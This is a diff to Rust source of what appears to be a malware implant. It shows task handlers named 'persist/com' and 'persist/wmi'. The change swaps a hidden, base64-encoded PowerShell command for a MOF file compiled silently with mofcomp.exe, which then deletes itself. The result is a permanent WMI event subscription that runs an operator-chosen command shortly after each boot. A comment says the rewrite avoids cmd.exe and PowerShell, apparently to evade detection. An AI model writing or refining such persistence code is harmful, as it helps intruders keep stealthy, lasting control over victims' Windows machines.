@@ -185,27 +185,55 @@ fn persist_com(v: &serde_json::Value) -> TaskOutput {
     TaskOutput::success(format!("persist/com: hijacked CLSID {clsid}").into_bytes())
 }
 
-// ── WMI subscription (via PowerShell) ────────────────────────────────────────
+// ── WMI subscription (via mofcomp.exe — no cmd.exe, no PowerShell) ──────────
 
 #[cfg(target_os = "windows")]
 fn persist_wmi(v: &serde_json::Value) -> TaskOutput {
     let name = match v.get("name").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/wmi: missing name") };
     let cmd  = match v.get("cmd").and_then(|s| s.as_str()) { Some(s) => s, None => return TaskOutput::failure("persist/wmi: missing cmd") };
 
-    let ps = format!(
-        r#"$f=New-Object -ComObject WScript.Shell;$filter=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{Name='{name}';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime>=120 AND TargetInstance.SystemUpTime<180'}};$consumer=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{name}';CommandLineTemplate='{cmd}'}};Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter;Consumer=$consumer}}"#
+    let cmd_mof = cmd.replace('\\', "\\\\").replace('"', "\\\"");
+
+    let mof = format!(
+        "#pragma namespace (\"\\\\\\\\.\\\\root\\\\subscription\")\r\n\
+         instance of __EventFilter as $filter {{\r\n\
+             Name = \"{name}\";\r\n\
+             EventNameSpace = \"root\\\\cimv2\";\r\n\
+             QueryLanguage = \"WQL\";\r\n\
+             Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime>=120 AND TargetInstance.SystemUpTime<180\";\r\n\
+         }};\r\n\
+         instance of CommandLineEventConsumer as $consumer {{\r\n\
+             Name = \"{name}\";\r\n\
+             CommandLineTemplate = \"{cmd_mof}\";\r\n\
+         }};\r\n\
+         instance of __FilterToConsumerBinding {{\r\n\
+             Filter = $filter;\r\n\
+             Consumer = $consumer;\r\n\
+         }};\r\n"
     );
 
-    let shell_cmd = format!("powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {}", b64_encode_ps(&ps));
-    shell_run(&shell_cmd)
-        .map(|out| TaskOutput::success(out))
-        .unwrap_or_else(|e| TaskOutput::failure(&e))
-}
+    let windir = std::env::var("WINDIR").unwrap_or_else(|_| "C:\\Windows".into());
+    let mof_path = std::env::temp_dir().join(format!("dm_{name}.mof"));
+    if let Err(e) = std::fs::write(&mof_path, mof.as_bytes()) {
+        return TaskOutput::failure(&format!("persist/wmi: write mof: {e}"));
+    }
 
-fn b64_encode_ps(cmd: &str) -> String {
-    use base64::Engine;
-    let utf16: Vec<u8> = cmd.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
-    base64::engine::general_purpose::STANDARD.encode(&utf16)
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x08000000;
+    let result = std::process::Command::new(format!("{windir}\\System32\\wbem\\mofcomp.exe"))
+        .arg(mof_path.to_str().unwrap_or(""))
+        .creation_flags(CREATE_NO_WINDOW)
+        .output();
+    let _ = std::fs::remove_file(&mof_path);
+
+    match result {
+        Ok(o) if o.status.success() => TaskOutput::success(format!("persist/wmi: subscription '{name}' created").into_bytes()),
+        Ok(o)  => {
+            let err = String::from_utf8_lossy(&[o.stdout, o.stderr].concat()).to_string();
+            TaskOutput::failure(&format!("persist/wmi: mofcomp failed: {err}"))
+        }
+        Err(e) => TaskOutput::failure(&format!("persist/wmi: spawn: {e}")),
+    }
 }
 
 // ── Registry helpers ──────────────────────────────────────────────────────────
